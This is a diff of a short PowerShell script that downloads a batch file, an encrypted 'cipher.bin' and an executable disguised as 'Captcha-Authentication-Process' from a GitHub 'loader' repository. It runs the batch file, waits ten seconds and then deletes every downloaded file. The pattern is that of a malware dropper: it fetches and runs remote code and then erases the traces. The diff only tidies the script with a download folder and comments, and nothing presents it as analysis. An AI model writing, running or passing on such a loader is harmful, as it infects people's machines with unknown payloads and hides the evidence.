@@ -1,4 +1,11 @@
+# Define the download location
+$downloadPath = "C:\MyDownloads"
+# Create the directory if it doesn't exist
+if (-not (Test-Path -Path $downloadPath)) {
+    New-Item -ItemType Directory -Path $downloadPath
+}
 
+# Define the URLs
 $urls = @(
     "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat",
     "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin",
@@ -6,16 +13,17 @@ $urls = @(
     "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe"
 )
 
+# Download the files
 foreach ($url in $urls) {
-    $filename = Split-Path -Leaf $url
-    Invoke-WebRequest -Uri $url -OutFile $filename
+    $fileName = Join-Path -Path $downloadPath -ChildPath (Split-Path -Path $url -Leaf)
+    Invoke-WebRequest -Uri $url -OutFile $fileName
 }
 
-Start-Process -FilePath "main.bat"
+# Run main.bat
+Start-Process -FilePath (Join-Path -Path $downloadPath -ChildPath "main.bat") -NoNewWindow
 
+# Wait for 10 seconds
 Start-Sleep -Seconds 10
 
-foreach ($url in $urls) {
-    $filename = Split-Path -Leaf $url
-    Remove-Item $filename -Force
-}
+# Delete all downloaded files
+Remove-Item -Path $downloadPath\* -Force
